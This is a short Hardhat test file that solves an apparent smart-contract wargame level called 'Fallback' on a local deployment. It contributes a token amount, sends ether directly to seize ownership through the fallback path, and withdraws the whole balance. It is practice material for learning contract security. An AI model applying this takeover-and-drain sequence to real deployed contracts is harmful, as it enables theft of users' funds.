import { loadFixture, ethers, expect } from "./setup";

describe("Fallback", function() {

    async function deploy() {
        const signer = (await ethers.getSigners())[1];

        const Factory = await ethers.getContractFactory("Fallback");

        const contract = await Factory.deploy();

        await contract.waitForDeployment();

        return { signer, contract }
    }

    it("Solve the challenge", async function() {
        let tx;

        const { contract, signer } = await loadFixture(deploy);

        expect(contract.target).to.be.properAddress;
        
        tx = await contract.connect(signer).contribute({ value: 1 });
        await tx.wait();

        tx = await signer.sendTransaction({
            to: contract.target,
            value: 1, 
        });
        await tx.wait();

        tx = await contract.connect(signer).withdraw();
        await tx.wait();
        
        const balance = await ethers.provider.getBalance(contract.target);
        const owner = await contract.owner();

        expect(balance).to.eq(0);
        expect(owner).to.eq(signer.address);
    });

});